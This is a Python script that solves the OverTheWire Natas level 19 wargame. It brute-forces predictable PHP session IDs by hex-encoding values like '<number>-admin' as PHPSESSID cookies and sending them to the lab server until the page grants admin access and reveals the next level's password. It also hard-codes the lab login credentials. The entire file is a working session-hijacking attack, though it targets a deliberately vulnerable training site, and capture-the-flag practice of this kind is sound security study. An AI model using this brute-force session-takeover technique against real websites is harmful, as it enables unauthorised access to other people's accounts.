#!/bin/python3

import requests
import binascii

maxid = 641
user = "natas19"
passwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" 
url = "http://"+user+".natas.labs.overthewire.org"
key = 'PHPSESSID'
admin = '-admin'
match = "You are an admin. The credentials for the next level are:"

def str2byte(s):
	return bytes(s, encoding='utf-8')

def byte2hex(b):
	return ''.join([hex(n)[2:].rjust(2,'0') for n in b])

def str2hex(s):
	return byte2hex(str2byte(s))

for i in range(maxid):
	c = dict(PHPSESSID=str2hex(str(i)+admin))
	httpreq = requests.get(url, auth=(user, passwd), cookies=c)
	print (i)
	if match in str(httpreq.content):
		print (httpreq.content)
		break


	
